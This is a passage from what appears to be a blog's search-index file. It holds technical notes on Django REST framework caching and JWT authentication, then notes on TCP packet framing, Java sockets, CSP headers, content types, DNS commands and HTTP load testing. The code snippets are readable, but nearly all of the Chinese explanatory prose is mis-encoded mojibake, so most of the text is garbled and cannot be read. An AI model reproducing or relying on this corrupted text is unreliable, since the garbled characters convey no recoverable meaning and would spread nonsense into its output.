Course.objects.get(criteria=criteria_name) return course def get_readed_cache(criteria_name): #åˆ¤æ–­é”®æ˜¯å¦å­˜åœ¨ key = &#39;_key_course_query_criteria_&#39;+criteria_name if cache.has_key(key): data = cache.get(key) print(&#39;cache hit&#39;) else: #ä¸å­˜åœ¨ï¼Œåˆ™è·å–æ•°æ®ï¼Œå¹¶å†™å…¥ç¼“å­˜ data = get_data_from_db(criteria_name) #å†™å…¥ç¼“å­˜ cache.set(key, data, 3600-int(time.time() % 3600)) print(&#39;sorry , no cache&#39;) return data # Create your views here. class CourseApiView(APIView): def post(self,request,format=None): serializer = CourseSerializer(data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data,status=status.HTTP_201_CREATED) return Response(data={&quot;msg&quot;:&quot;invalid data&quot;},status=status.HTTP_400_BAD_REQUEST) def get(self, request, *args, **kwargs): critia = request.query_params.get(&#39;criteria&#39;,None) if critia: cached_data = get_readed_cache(critia) course = cached_data if course: serializer = CourseSerializer(course) return Response(serializer.data,status=status.HTTP_200_OK) return Response(&quot;not found&quot;,status=status.HTTP_404_NOT_FOUND) drfé»˜è®¤çš„admin pannelå¯ä»¥è‡ªå®šä¹‰æ ·å¼å’ŒåŠŸèƒ½è¿™äººçš„åšå®¢ä¸é”™ querySeté‡Œé¢æœ‰ä¸€ä¸ª_setåœ¨moderlä¸­æ²¡æœ‰å£°æ˜related_nameçš„æƒ…å†µä¸‹ï¼Œéœ€è¦é€šè¿‡_setæ¥åå‘æŸ¥æ‰¾model For example, if Product had a many-to-many relationship with User, named purchase, you might want to write a view like this: class PurchasedProductsList(generics.ListAPIView): &quot;&quot;&quot; Return a list of all the products that the authenticated user has ever purchased, with optional filtering. &quot;&quot;&quot; model = Product serializer_class = ProductSerializer filter_class = ProductFilter def get_queryset(self): user = self.request.user return user.purchase_set.all() filter_backendæ˜¯å®šä¹‰åœ¨GenericAPIViewä¸­çš„ï¼Œæ‰€ä»¥è¦ä½¿ç”¨è¿™ä¸ªå±æ€§å¾—ç”¨GenericAPIView nested relations json web token authentication pip install djangorestframework-jwt ##settings.py REST_FRAMEWORK = { &#39;DEFAULT_AUTHENTICATION_CLASSES&#39;: ( &#39;rest_framework.authentication.BasicAuthentication&#39;, &#39;rest_framework.authentication.SessionAuthentication&#39;, # &#39;rest_framework.authentication.TokenAuthentication&#39;, &#39;rest_framework_jwt.authentication.JSONWebTokenAuthentication&#39;, # åŠ å…¥æ­¤è¡Œ ), } ## urls.py urlpatterns = [ ... # url(r&#39;api-auth-token/&#39;, authtoken_views.obtain_auth_token), # drfè‡ªå¸¦çš„tokenè®¤è¯ url(r&#39;login/&#39;, jwt_authtoken_views.obtain_jwt_token), # åŠ æ­¤è¡Œï¼Œjwtè®¤è¯ ] ç„¶åé€šè¿‡postè¯·æ±‚127.0.0.1/login/,bodyä¸­æ·»åŠ usernameå’Œpasswordå¾—åˆ°è¿™æ ·çš„response { &quot;token&quot;: &quot;someweirdwords---------&quot; } ä¸‹æ¬¡è¯·æ±‚çš„æ—¶å€™å¸¦ä¸Šè¿™ä¸ªHeaderå°±å¥½äº† &quot;Authorization&quot;: &quot;JWT someweirdwords---------&quot; é€šè¿‡manage.pyåˆ›å»ºuserçš„æ–¹å¼ï¼š user@host&gt; manage.py shell &gt;&gt;&gt; from django.contrib.auth.models import User &gt;&gt;&gt; user=User.objects.create_user(&#39;John&#39;, password=&#39;password123&#39;) &gt;&gt;&gt; user.is_superuser=False &gt;&gt;&gt; user.is_staff=False &gt;&gt;&gt; user.save() ç”¨jwtå»è¯·æ±‚éœ€è¦authenticationçš„æ¥å£æ—¶ï¼Œheaderé‡Œé¢å¾—å¸¦ä¸Šä¸€ä¸ª Authorization: Token ç™»å½•.æ¥å£.è¿”å›çš„token æ³¨æ„Tokenè¿™ä¸ªå•è¯åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ caching django with redisredirect in django","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"django","slug":"django","permalink":"https://haldir65.github.io/tags/django/"}]},{"title":"ç½‘ç»œé€šä¿¡æ‰‹å†Œ-2","date":"2018-04-26T13:00:02.000Z","path":"2018/04/26/2018-04-26-network-manual-2/","text":"OkHttpé€šè¿‡ConnectionPoolåšåˆ°tcpè¿æ¥å¤ç”¨ï¼ˆåœ¨Timeoutå†…ï¼‰,æ‰€ä»¥å¹¶ä¸æ˜¯æ¯ä¸ªhttpéƒ½å»å»ºç«‹ä¸€ä¸ªtcpè¿æ¥è‡ªå®šä¹‰é€šè®¯åè®®ï¼Œä½¿ç”¨java socketå®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ†åŒ…é—®é¢˜å’Œé»åŒ…é—®é¢˜ 1. httpè¯·æ±‚ä¸­tcpè¿æ¥çš„å¤ç”¨(http -keep aliveæ˜¯åº”ç”¨å±‚çš„å®ç°ï¼Œä¸tcp kkepaliveé‚£ä¸ª2å°æ—¶æ²¡å…³ç³»)2. è‡ªå®šä¹‰é€šè®¯åè®®httpè¿™ç§å±äºåº”ç”¨å±‚çš„åè®®å®šä¹‰äº†æ¯ä¸ªæ•°æ®åŒ…çš„ç»“æ„æ˜¯æ€æ ·çš„ã€‚åœ¨ä¸€äº›åœºåˆä¸‹ï¼Œæ¯”å¦‚è¿½æ±‚é€šè®¯é€Ÿåº¦ï¼Œè‡ªå®šä¹‰åŠ å¯†æ‰‹æ®µï¼Œå¯èƒ½éœ€è¦è‡ªå®šä¹‰ç»“æ„ä½“ã€‚è‡ªå·±ç”¨Socketå®ç°ä¸€å¥—server-clienté€šè®¯æ¨¡å‹å…¶å®ä¸éš¾ã€‚serverè¿™è¾¹ï¼Œå…ˆç¡®å®šè‡ªå·±å¯¹å¤–å…¬å¸ƒçš„ip,portã€‚ç„¶åèµ·ä¸€ä¸ªserverSocketï¼Œæ­»å¾ªç¯å»acceptï¼Œæ¯æ¬¡acceptåˆ°ä¸€ä¸ªå°±æ·»åŠ åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼ŒåŒæ—¶ç”¨çº¿ç¨‹æ± å»æ‰§è¡Œä¸€ä¸ªæ­»è·‘ä»socketä¸­readçš„runnableã€‚clientè¿™è¾¹ï¼Œæ ¹æ®serverçš„ipå’Œportå»è¿æ¥ä¸Šï¼Œclientä¸»åŠ¨å‘æ¶ˆæ¯(byteï¼Œint,Stringç±»å‹éƒ½è¡Œ)ï¼Œserverè¿™è¾¹è¯»åˆ°ä¿¡æ¯ï¼Œç»™å‡ºresponseï¼Œclinentå†è¯»å–serverçš„å›è¯ï¼Œå°±è·Ÿä¸¤ä¸ªäººä¹‹é—´ä½ ä¸€å¥æˆ‘ä¸€å¥è¯´è¯ä¸€æ ·ã€‚æ•´ä¸ªè¿‡ç¨‹ä¸­ ä¿æŒäº†é•¿è¿æ¥,åªè¦ä»»ä½•ä¸€æ–¹æ²¡æœ‰æ‰‹åŠ¨è®¾ç½®socket.setSoTimeoutçš„è¯ï¼Œæ”¾ä¸€æ™šä¸Šéƒ½ä¸ä¼šæ–­å¼€ã€‚ ä¸€ä¸ªé‡ç‚¹æ˜¯åŒæ–¹å‘é€çš„æ¶ˆæ¯æ ¼å¼ï¼Œå³ä¸¤ä¸ªäººäº¤æµçš„è¯­è¨€ï¼Œå¦‚æœå…¨éƒ¨æ˜¯Stringçš„è¯ï¼Œé‚£å°±è·Ÿhttpå¾ˆåƒäº†ï¼Œå½“ç„¶ä»»ä½•æ•°æ®æ ¼å¼ä»socketå‘å‡ºå»æœ€ç»ˆéƒ½æ˜¯ä»¥byteçš„å½¢å¼å‘å‡ºå»çš„(æ¯”å¦‚stringä¼šç”¨utf-8æˆ–è€…gbkç¼–ç æˆbyteæ•°ç»„)ã€‚googleçš„protoBufferæœ€é‡è¦çš„ä¸¤ä¸ªæ–¹æ³•writeTo(objectè½¬æˆbyteæ•°ç»„)å’ŒparseFrom(byteæ•°ç»„è½¬æˆobject)ã€‚ åŸºäºJava Socketçš„è‡ªå®šä¹‰åè®®ï¼Œå®ç°Androidä¸æœåŠ¡å™¨çš„é•¿è¿æ¥ï¼ˆäºŒï¼‰ï¼ŒåŸºäºè¿™ç¯‡æ–‡ç« ï¼Œå¯ä»¥å°†æ•°æ®ç±»å‹å®šä¹‰ä¸ºç»Ÿä¸€çš„protocolï¼Œprotocolçš„è¦ç´ åŒ…æ‹¬: åè®®ç‰ˆæœ¬æ•°æ®ç±»å‹ï¼ˆæ•°æ®ç±»åè®®ï¼Œæ•°æ®ackç±»åè®®ï¼Œå¿ƒè·³ç±»åè®®ï¼Œå¿ƒè·³ackç±»åè®®ï¼‰æ•°æ®é•¿åº¦(è¿™å¾ˆé‡è¦)æ¶ˆæ¯idæ‰©å±•å­—æ®µ åè®®ç‰ˆæœ¬è¦åšåˆ°å‘åå…¼å®¹ï¼ŒåŸºæœ¬ä¸Šåªæ·»åŠ æ•°æ®å®ä½“ä¸åˆ é™¤æ•°æ®å®ä½“å°±å¯ä»¥äº†æ•°æ®ç±»å‹å¿…éœ€çš„ä¸‰ä¸ªè¦ç´ æ˜¯ï¼šé•¿åº¦ï¼Œç‰ˆæœ¬å·ï¼Œæ•°æ®ç±»å‹ (æ¯”æ–¹è¯´0è¡¨ç¤ºä¸šåŠ¡æ•°æ®ï¼Œ1è¡¨ç¤ºæ•°æ®ack,2è¡¨ç¤ºå¿ƒè·³ï¼Œ3è¡¨ç¤ºå¿ƒè·³ack)ã€‚æ‰©å±•å­—æ®µç±»ä¼¼äºextraï¼Œå¯ä»¥ç”¨jsonæˆ–è€…åˆ«çš„ä»€ä¹ˆå»å®ç°ã€‚ 3. tcpçš„åˆ†åŒ…å’Œç²˜åŒ…é—®é¢˜tcpå‘åŒ…çš„æ—¶å€™ï¼Œå¦‚æœä¸€ä¸ªåŒ…è¿‡å¤§ï¼Œä¼šæ‹†æˆä¸¤ä¸ªåŒ…å‘(åˆ†åŒ…)ã€‚å¦‚æœå¤ªå°ï¼Œå‘é€æ–¹ä¼šæ”’ç€å’Œä¸‹ä¸€ä¸ªåŒ…ä¸€èµ·å‘ï¼ˆç²˜åŒ…ï¼‰ï¼Œtcpä¸ºäº†æé«˜æ•ˆç‡(ä½¿ç”¨Nagleç®—æ³•)ä¼šç¼“å†²Nä¸ªåŒ…åå†ä¸€èµ·å‘å‡ºå»ã€‚ä½œä¸ºæ¥æ”¶æ–¹å¹¶ä¸çŸ¥é“æ”¶åˆ°çš„åŒ…æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŒ…è¿˜æ˜¯è¢«æ‹†åˆ†çš„è¿˜æ˜¯ç”±ä¸¤ä¸ªåŒ…åˆå¹¶è€Œæ¥ã€‚ å¯èƒ½å‘ç”Ÿåˆ†åŒ…å’Œç²˜åŒ…çš„åŸå› åŒ…æ‹¬ï¼š1ã€è¦å‘é€çš„æ•°æ®å¤§äºTCPå‘é€ç¼“å†²åŒºå‰©ä½™ç©ºé—´å¤§å°ï¼Œå°†ä¼šå‘ç”Ÿæ‹†åŒ…ã€‚ 2ã€å¾…å‘é€æ•°æ®å¤§äºMSSï¼ˆæœ€å¤§æŠ¥æ–‡é•¿åº¦ï¼‰ï¼ŒTCPåœ¨ä¼ è¾“å‰å°†è¿›è¡Œæ‹†åŒ…ã€‚ 3ã€è¦å‘é€çš„æ•°æ®å°äºTCPå‘é€ç¼“å†²åŒºçš„å¤§å°ï¼ŒTCPå°†å¤šæ¬¡å†™å…¥ç¼“å†²åŒºçš„æ•°æ®ä¸€æ¬¡å‘é€å‡ºå»ï¼Œå°†ä¼šå‘ç”Ÿç²˜åŒ…ã€‚ 4ã€æ¥æ”¶æ•°æ®ç«¯çš„åº”ç”¨å±‚æ²¡æœ‰åŠæ—¶è¯»å–æ¥æ”¶ç¼“å†²åŒºä¸­çš„æ•°æ®ï¼Œå°†å‘ç”Ÿç²˜åŒ…ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“TCPå±äºä¼ è¾“å±‚çš„åè®®ï¼Œä¼ è¾“å±‚é™¤äº†æœ‰TCPåè®®å¤–è¿˜æœ‰UDPåè®®ã€‚é‚£ä¹ˆUDPæ˜¯å¦ä¼šå‘ç”Ÿç²˜åŒ…æˆ–æ‹†åŒ…çš„ç°è±¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¸ä¼šã€‚UDPæ˜¯åŸºäºæŠ¥æ–‡å‘é€çš„ï¼Œä»UDPçš„å¸§ç»“æ„å¯ä»¥çœ‹å‡ºï¼Œåœ¨UDPé¦–éƒ¨é‡‡ç”¨äº†16bitæ¥æŒ‡ç¤ºUDPæ•°æ®æŠ¥æ–‡çš„é•¿åº¦ï¼Œå› æ­¤åœ¨åº”ç”¨å±‚èƒ½å¾ˆå¥½çš„å°†ä¸åŒçš„æ•°æ®æŠ¥æ–‡åŒºåˆ†å¼€ï¼Œä»è€Œé¿å…ç²˜åŒ…å’Œæ‹†åŒ…çš„é—®é¢˜ã€‚è€ŒTCPæ˜¯åŸºäºå­—èŠ‚æµçš„ï¼Œè™½ç„¶åº”ç”¨å±‚å’ŒTCPä¼ è¾“å±‚ä¹‹é—´çš„æ•°æ®äº¤äº’æ˜¯å¤§å°ä¸ç­‰çš„æ•°æ®å—ï¼Œä½†æ˜¯TCPæŠŠè¿™äº›æ•°æ®å—ä»…ä»…çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµï¼Œæ²¡æœ‰è¾¹ç•Œï¼›å¦å¤–ä»TCPçš„å¸§ç»“æ„ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œåœ¨TCPçš„é¦–éƒ¨æ²¡æœ‰è¡¨ç¤ºæ•°æ®é•¿åº¦çš„å­—æ®µï¼ŒåŸºäºä¸Šé¢ä¸¤ç‚¹ï¼Œåœ¨ä½¿ç”¨TCPä¼ è¾“æ•°æ®æ—¶ï¼Œæ‰æœ‰ç²˜åŒ…æˆ–è€…æ‹†åŒ…ç°è±¡å‘ç”Ÿçš„å¯èƒ½ã€‚ è™½ç„¶æœ‰åˆ†åŒ…å’Œç²˜åŒ…é—®é¢˜ï¼Œä½†æ˜¯ä½œä¸ºä¼ è¾“å±‚çš„tcpèƒ½å¤Ÿä¿è¯å‘é€å‡ºå»çš„é¡ºåºå’Œæ¥æ”¶åˆ°çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚é‚£ä¹ˆåŸºæœ¬çš„è§£å†³æ–¹æ³•ä¹Ÿå¾ˆæˆç†Ÿäº†ï¼š 1ã€å‘é€ç«¯ç»™æ¯ä¸ªæ•°æ®åŒ…æ·»åŠ åŒ…é¦–éƒ¨ï¼Œé¦–éƒ¨ä¸­åº”è¯¥è‡³å°‘åŒ…å«æ•°æ®åŒ…çš„é•¿åº¦ï¼Œè¿™æ ·æ¥æ”¶ç«¯åœ¨æ¥æ”¶åˆ°æ•°æ®åï¼Œé€šè¿‡è¯»å–åŒ…é¦–éƒ¨çš„é•¿åº¦å­—æ®µï¼Œä¾¿çŸ¥é“æ¯ä¸€ä¸ªæ•°æ®åŒ…çš„å®é™…é•¿åº¦äº†ã€‚2ã€å‘é€ç«¯å°†æ¯ä¸ªæ•°æ®åŒ…å°è£…ä¸ºå›ºå®šé•¿åº¦ï¼ˆä¸å¤Ÿçš„å¯ä»¥é€šè¿‡è¡¥0å¡«å……ï¼‰ï¼Œè¿™æ ·æ¥æ”¶ç«¯æ¯æ¬¡ä»æ¥æ”¶ç¼“å†²åŒºä¸­è¯»å–å›ºå®šé•¿åº¦çš„æ•°æ®å°±è‡ªç„¶è€Œç„¶çš„æŠŠæ¯ä¸ªæ•°æ®åŒ…æ‹†åˆ†å¼€æ¥ã€‚3ã€å¯ä»¥åœ¨æ•°æ®åŒ…ä¹‹é—´è®¾ç½®è¾¹ç•Œï¼Œå¦‚æ·»åŠ ç‰¹æ®Šç¬¦å·ï¼Œè¿™æ ·ï¼Œæ¥æ”¶ç«¯é€šè¿‡è¿™ä¸ªè¾¹ç•Œå°±å¯ä»¥å°†ä¸åŒçš„æ•°æ®åŒ…æ‹†åˆ†å¼€ã€‚ å¦å¤–ï¼Œhttpåè®®æ˜¯é€šè¿‡æ·»åŠ æ¢è¡Œç¬¦â€œ /r/nâ€è¿™ç§å½¢å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜çš„å‚è€ƒTCPç²˜åŒ…ï¼Œæ‹†åŒ…åŠè§£å†³æ–¹æ³• 4. javaè¿™è¾¹socketçš„inputStreamçš„readæ–¹æ³•æ˜¯ä¼šå µå¡çš„å°±æ˜¯readæ–¹æ³•ä¸€ç›´ä¸è¿”å›ï¼ŒSocketåªæ˜¯ä¸€åº§æ¡¥æ¢ï¼Œå¹¶ä¸åƒæœ¬åœ°æ–‡ä»¶ä¸€æ ·ï¼Œæ‰€ä»¥æ— æ³•çŸ¥é“å¯¹æ–¹æ˜¯å¦æŠŠè¯è¯´å®Œäº†ã€‚åªæœ‰ä¸€æ–¹è°ƒç”¨socketçš„closeæ–¹æ³•æ—¶æ‰ä¼šå‘é€EOFç»“æŸç¬¦ï¼Œå¦ä¸€æ–¹çš„read = -1 æ‰èƒ½æˆç«‹ï¼Œå¦åˆ™readæ–¹æ³•å°±å µå¡åœ¨é‚£é‡Œã€‚InputStreamæœ‰ä¸€ä¸ªavailable()æ–¹æ³•ï¼šan estimate of the number of bytes that can be read (or skippedover) from this input stream without blocking or 0 when it reaches the end of the input stream.oves) ã€‚ä¸è¦æŠŠè¿™ä¸ªæ–¹æ³•ä¸­çš„è¿”å›å€¼å½“åšè¿™ä¸ªæµä¸­æ‰€æœ‰å¯èƒ½æ•°æ®çš„æ€»å’Œ(å¤šæ•°æƒ…å†µä¸‹è¿™ç§çŒœæµ‹æ˜¯é”™è¯¯çš„)ã€‚ tcpçš„backlogå˜é‡ å»ºç«‹TCPè¿æ¥æ—¶éœ€è¦å‘é€åŒæ­¥SYNæŠ¥æ–‡ï¼Œç„¶åç­‰å¾…ç¡®è®¤æŠ¥æ–‡SYN+ACKï¼Œæœ€åå†å‘é€ç¡®è®¤æŠ¥æ–‡ACKã€‚ å¦‚æœåº”ç”¨å±‚ä¸èƒ½åŠæ—¶æ¥å—å·²è¢«TCPæ¥å—çš„è¿æ¥ï¼Œè¿™äº›è¿æ¥å¯èƒ½å æ»¡æ•´ä¸ªè¿æ¥é˜Ÿåˆ—ï¼Œæ–°çš„è¿æ¥è¯·æ±‚å¯èƒ½ä¸è¢«å“åº”è€Œä¼šè¶…æ—¶ã€‚å¦‚æœä¸€ä¸ªè¿æ¥è¯·æ±‚SYNå‘é€åï¼Œä¸€æ®µæ—¶é—´åæ²¡æœ‰æ”¶åˆ°ç¡®è®¤SYN+ACKï¼ŒTCPä¼šé‡ä¼ è¿™ä¸ªè¿æ¥è¯·æ±‚SYNä¸¤æ¬¡ï¼Œæ¯æ¬¡é‡ä¼ çš„æ—¶é—´é—´éš”åŠ å€ï¼Œåœ¨è§„å®šçš„æ—¶é—´å†…ä»æ²¡æœ‰æ”¶åˆ°SYN+ACKï¼ŒTCPå°†æ”¾å¼ƒè¿™ä¸ªè¿æ¥è¯·æ±‚ï¼Œè¿æ¥å»ºç«‹å°±è¶…æ—¶äº†ã€‚ JAVA Socketè¶…æ—¶æµ…æ BufferedWriterçš„ä¸»è¦åŸç†æ˜¯å†…éƒ¨ä¿ç•™äº†ä¸€ä¸ªchar[]çš„æ•°ç»„ï¼Œæ¯æ¬¡å¤–éƒ¨è°ƒç”¨writeçš„æ—¶å€™ï¼Œä¸æ˜¯ç›´æ¥å†™åˆ°underlying çš„outputä¸­ï¼Œè€Œæ˜¯system.arrayCopyåˆ°è‡ªå·±çš„char[]æ•°ç»„ä¸­ï¼Œç­‰å‘ç°char[]æ•°ç»„å¡«æ»¡äº†ï¼Œæ‰å»flushBufferï¼Œå°±æ˜¯æŠŠæ‰€æœ‰ç¼“å­˜çš„å†…å®¹ä¸€æ¬¡æ€§å†™åˆ°åº•å±‚çš„outputStreamä¸­ã€‚å› ä¸ºoutputStreamæ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å»å†™çš„ï¼Œæ¯æ¬¡å†™éƒ½è¦è°ƒç”¨ioæ“ä½œï¼Œè€Œioæ“ä½œæ˜¯å¾ˆè€—è´¹èµ„æºçš„ã€‚æ‰€ä»¥bufferedWriterä¸€æ¬¡æ€§å†™å¤§é‡çš„æ•°æ®ï¼Œèƒ½å¤Ÿæœ‰æ•ˆå‡å°‘ioæ¬¡æ•°ï¼Œæé«˜æ€§èƒ½ã€‚ ä»¥TCP/IPåè®®ä¸ºä¾‹ï¼Œå¦‚ä½•é€šè¿‡wiresharkæŠ“åŒ…åˆ†æï¼Ÿ ä½¿ç”¨Nginxä»£ç†wsä¸ºwssåè®® CRSF Content Security Policy å…¥é—¨æ•™ç¨‹ä¸¤ç§æ–¹å¼è®¾ç½®cspç™½åå•ï¼Œä¸€ç§æ˜¯æœåŠ¡å™¨åœ¨responseçš„headerä¸­æ·»åŠ â€™Content-Security-Policyâ€™è¿™ä¸ªheaderï¼Œå¦ä¸€ç§æ˜¯åœ¨htmlä¸­å†™metaæ ‡ç­¾ &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; httpè¯·æ±‚æ˜¯ä¸€è¡Œä¸€è¡Œçš„æ–‡å­—ï¼ŒcontentType only affects the body/document.you can use any ISO-8859-1 characters in the header.ã€‚ISO-8859-1ä¸æ”¯æŒä¸­æ–‡ï¼Œæ‰€ä»¥headeré‡Œé¢çš„ä¸œè¥¿ä¸èƒ½å†™ä¸­æ–‡ã€‚bodyå’Œpathé‡Œé¢éšæ„äº† //ç½‘é¡µä¸Šä¼ excelè¡¨æ ¼çš„headerContent-Disposition: form-data; name=â€files[]â€ filename=â€sample.xlsâ€Content-Type: application/vnd.ms-excel Content-Dispositionçš„è§£é‡Š ä¸Šä¼ æ–‡ä»¶çš„è¯ä¼šè®¾ç½®Content-Typeä¸ºmultipart/form-dataï¼Œå¹¶æŒ‡å®šboundaryçš„å€¼æ¥æ ‡è¯†è¯·æ±‚ä½“ä¸­å†…å®¹çš„åˆ†ç•Œï¼Œè€Œåœ¨è¯·æ±‚ä½“ä¸­ï¼Œä¸åŒçš„å†…å®¹(å¦‚ï¼šæ–‡ä»¶Aå’Œæ–‡ä»¶B)ä¹‹é—´ä½¿ç”¨boundaryçš„å€¼æ¥æ ‡è¯†åˆ†ç•Œï¼Œå¹¶ä¸”è¯·æ±‚ä½“ä¸­æ¯éƒ¨åˆ†å†…å®¹éƒ½ä¼šæœ‰Content-Dispositionå’ŒContent-Typeæ¥æŒ‡æ˜è¿™éƒ¨åˆ†å†…å®¹çš„ç±»å‹å’Œä¿¡æ¯ã€‚åç«¯çš„è¯ä½¿ç”¨ServletFileUploadæ¥è§£æè¯·æ±‚ï¼Œè·å¾—FileItemçš„Listï¼Œéå†Itemï¼Œç„¶åé€šè¿‡Itemè·å¾—è¾“å…¥æµï¼Œä»è¾“å…¥æµä¸­è¯»å–ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®ï¼Œå†æ„å»ºFileOutputStreamè¾“å‡ºåˆ°ç£ç›˜ä¸­ä¿å­˜ã€‚å¦‚æœä½¿ç”¨Spring MVCï¼Œåˆ™å¯ä»¥åœ¨æ¥æ”¶è¯·æ±‚çš„æ–¹æ³•ä¸­æ¥æ”¶CommonsMultipartFileï¼Œå¹¶ä½¿ç”¨transferToæ–¹æ³•ä¿å­˜åˆ°ç£ç›˜ä¸­ã€‚ htmlé‡Œé¢ä¸Šä¼ æ–‡ä»¶ä¸€èˆ¬æ˜¯ajaxå¯¹è±¡sendä¸€ä¸ªFormDataå‡ºå»ï¼Œä¹Ÿæœ‰Base64ç¼–ç ä¸€éç„¶ååœ¨æœåŠ¡ç«¯base64è§£ç çš„ã€‚ä¸»è¦æ˜¯html5æ ‡å‡†ä¸­æ·»åŠ äº†æ–°çš„FileReaderæ¥å£ï¼Œå¯ä»¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥å¾ˆå¤šå¼€å‘å°±è°ƒç”¨FileReaderçš„readAsDataURLæ–¹æ³•å»å°†æ–‡ä»¶çš„å†…å®¹å˜æˆDATA URLå½¢å¼çš„å­—ç¬¦ä¸²ä¸è¿‡è¿™ä¹ˆå¹²è¿˜æ˜¯æœ‰ç¼ºç‚¹çš„ Data URLå½¢å¼çš„å›¾ç‰‡ä¸ä¼šè¢«æµè§ˆå™¨ç¼“å­˜ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡è®¿é—®è¿™æ ·é¡µé¢æ—¶éƒ½è¢«ä¸‹è½½ä¸€æ¬¡ï¼Œä½†å¯é€šè¿‡åœ¨cssæ–‡ä»¶çš„background-imageæ ·å¼è§„åˆ™ä½¿ç”¨Data URI Schemeï¼Œä½¿å…¶éšcssæ–‡ä»¶ä¸€åŒè¢«æµè§ˆå™¨ç¼“å­˜èµ·æ¥ï¼‰ã€‚ Base64ç¼–ç çš„æ•°æ®ä½“ç§¯é€šå¸¸æ˜¯åŸæ•°æ®çš„ä½“ç§¯4/3ï¼Œä¹Ÿå°±æ˜¯Data URLå½¢å¼çš„å›¾ç‰‡ä¼šæ¯”äºŒè¿›åˆ¶æ ¼å¼çš„å›¾ç‰‡ä½“ç§¯å¤§1/3ã€‚ ç§»åŠ¨ç«¯æ€§èƒ½æ¯”è¾ƒä½ã€‚ åŸŸåè§£æä¹‹dig,host,nslookupå‘½ä»¤å¥½ç”¨çš„å‘½ä»¤ dig +trace baidu.comnslookup www.youtube.com 1.1.1.1 //æŒ‡å®šserverï¼Œå›½å†…å› ä¸ºdnsæ±¡æŸ“ï¼Œè¿”å›çš„ç»“æœæ˜¯é”™è¯¯çš„nslookup -vc google.com 8.8.8.8 // -vcæ˜¯æŒ‡å¼ºåˆ¶èµ°tcpæŸ¥è¯¢dnsnslookup -d www.163.com //æ˜¾ç¤ºttlnslookup -&gt; set debug -&gt; www.163.com //è¿™ä¸‰æ¡èµ°å®Œæ˜¯ä¸€æ ·çš„ï¼Œç±»ä¼¼äºäº¤äº’æ¨¡å¼digæŒ–å‡ºDNSçš„ç§˜å¯† dnsæŸ¥è¯¢ä¹Ÿå¯ä»¥ä½¿ç”¨tcpThe Transmission Control Protocol (TCP) is used when the response data size exceeds 512 bytes, or for tasks such as zone transfers. è¯¦ç»†çš„http-content-typeè¡¨æ ¼å…³äºcontent-type,æ‰¾åˆ°ä¸€ç¯‡ä»‹ç»å…³äºHttp headerå¸¸ç”¨å­—æ®µç†è§£Http HeaderHttpåº•å±‚TCP ,ACK ç­‰ç­‰éœ€è¦tcpcumpç»“åˆwireSharkæŠ“åŒ… ä¸‹é¢æ˜¯å‡ ä¸ªå¸¸è§çš„Content-Type:1.text/html2.text/plain3.text/css4.text/javascript5.application/x-www-form-urlencoded6.multipart/form-data7.application/json8.application/xmlâ€¦å‰é¢å‡ ä¸ªéƒ½å¾ˆå¥½ç†è§£ï¼Œéƒ½æ˜¯htmlï¼Œcssï¼Œjavascriptçš„æ–‡ä»¶ç±»å‹ï¼Œåé¢å››ä¸ªæ˜¯POSTçš„å‘åŒ…æ–¹å¼ã€‚ éå®˜æ–¹çš„mime-typeå¤§å…¨MDNä¸Šæ”¶å½•çš„mime-typeX-Content-Type-Options:nosniff.å°±æ˜¯è¯´æœåŠ¡å™¨è¿”å›çš„Responseä¸­å¦‚æœåŒ…å«è¿™ä¸ªheaderçš„è¯ï¼Œscriptå’ŒstyleSheetå…ƒç´ ä¼šæ‹’ç»é”™è¯¯çš„MIMEç±»å‹çš„å“åº”ã€‚ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ç»™äºˆMIMEç±»å‹çš„æ··æ·†æ”»å‡» Referrer Policy: unsafe-urlunsafe-urlåå°åœ¨responseä¸­è¿”å›ä¸€ä¸ª302ï¼Œå¹¶åœ¨response headerä¸­æ·»åŠ header:locationã€‚ç›´æ¥æŠŠå‰ç«¯ç½‘é¡µé‡å®šå‘åˆ°æ–°çš„ä½ç½® æœåŠ¡å™¨å‹æµ‹å·¥å…·å‚è€ƒDigitalOceançš„æ–‡ç« ] npm install -g loadtest ##ä¸€ä¸ªnodeçš„å‹åŠ›æµ‹è¯•çš„web clientloadtest -n 100 -k http://localhost:8000/api/somebackend # -nè¡¨ç¤ºå‘é€100æ¬¡ -k è¡¨ç¤ºkeep-aliveloadtest -c 10 â€“rps 200 http://mysite.com/ # -cè¡¨ç¤ºclientï¼Œåˆ›å»º10ä¸ªclient ï¼Œ â€“rspè¡¨ç¤ºæ¯ç§’çš„è¯·æ±‚æ•°é‡loadtest -k -H â€˜Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8â€™ -H â€œUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36â€ â€“rps 1 https://www.baidu.com/æ³¨æ„ï¼š è¿™ç§çŸ­æœŸåˆ›å»ºå¤§é‡å¤–ç½‘è¿æ¥çš„è¡Œä¸ºä¼šå¯¹è·¯ç”±å™¨é€ æˆä¸€å®šå‹åŠ›ã€‚ã€‚ã€‚ã€‚ ab(ApacheBench) - a simple ,single-threaded command line tool for benchemarking an HTTP server.å› ä¸ºæ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½åˆ©ç”¨å¤šæ 